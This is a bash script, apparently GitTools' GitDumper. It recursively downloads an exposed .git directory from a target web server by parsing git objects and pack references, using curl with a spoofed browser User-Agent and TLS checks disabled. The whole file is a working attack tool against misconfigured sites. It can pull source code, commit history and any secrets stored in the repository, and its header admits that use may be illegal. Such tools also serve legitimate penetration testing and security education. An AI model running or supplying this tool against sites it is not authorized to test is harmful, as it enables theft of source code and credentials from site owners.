#!/bin/bash
#$1 : URL to download .git from (http://target.com/.git/)
#$2 : Folder where the .git-directory will be created

function init_header() {
    cat <<EOF
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


EOF
}

# get_arg "--git-dir=" ".git" "GITDIR" "$@" for "--git-dir=asd"
# returns asd in GITDIR
function get_arg() {
    local KEY=$1
    local DEFAULT=$2
    declare -n ret=$3
    local ARGS=${@:4}

    for arg in $ARGS
    do
        if [[ $arg == $KEY* ]]; then
            ret="${arg#$KEY}"
            return
        fi
    done

   ret="$DEFAULT"
}

init_header


QUEUE=();
DOWNLOADED=();
BASEURL="$1";
BASEDIR="$2";
get_arg "--git-dir=" ".git" "GITDIR" "$@"
BASEGITDIR="$BASEDIR/$GITDIR/";

if [ $# -lt 2 ]; then
    echo -e "\e[33m[*] USAGE: http://target.tld/.git/ dest-dir [--git-dir=otherdir]\e[0m";
    echo -e "\t\t--git-dir=otherdir\t\tChange the git folder name. Default: .git"
    exit 1;
fi


if [[ ! "$BASEURL" =~ /$GITDIR/$ ]]; then
    echo -e "\e[31m[-] /$GITDIR/ missing in url\e[0m";
    exit 0;
fi

if [ ! -d "$BASEGITDIR" ]; then
    echo -e "\e[33m[*] Destination folder does not exist\e[0m";
    echo -e "\e[32m[+] Creating $BASEGITDIR\e[0m";
    mkdir -p "$BASEGITDIR";
fi


function start_download() {
    #Add initial/static git files
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')

    #Iterate through QUEUE until there are no more files to download
    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        #Remove item from QUEUE
        QUEUE=( "${QUEUE[@]:1}" )
    done
}

function download_item() {
    local objname=$1
    local url="$BASEURL$objname"
    local hashes=()
    local packs=()

    #Check if file has already been downloaded
    if [[ " ${DOWNLOADED[@]} " =~ " ${objname} " ]]; then
        return
    fi

    local target="$BASEGITDIR$objname"

    #Create folder
    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    #Download file
    curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
    
    #Mark as downloaded and remove it from the queue
    DOWNLOADED+=("$objname")
    if [ ! -f "$target" ]; then
        echo -e "\e[31m[-] Downloaded: $objname\e[0m"
        return
    fi
    echo -e "\e[32m[+] Downloaded: $objname\e[0m"

    #Check if we have an object hash
    if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
        #Switch into $BASEDIR and save current working directory
        cwd=$(pwd)
        cd "$BASEDIR"
        
        #Restore hash from $objectname
        hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
        
        #Check if it's valid git object
        type=$(git cat-file -t "$hash" 2> /dev/null)
        if [ $? -ne 0 ]; then
            #Delete invalid file
            cd "$cwd"
            rm "$target"
            return 
        fi
        
        #Parse output of git cat-file -p $hash. Use strings for blobs
        if [[ "$type" != "blob" ]]; then
            hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))
        else
            hashes+=($(git cat-file -p "$hash" | strings -a | grep -oE "([a-f0-9]{40})"))
        fi

        cd "$cwd"
    fi 
    
    #Parse file for other objects
    hashes+=($(cat "$target" | strings -a | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    #Parse file for packs
    packs+=($(cat "$target" | strings -a | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done
}


start_download
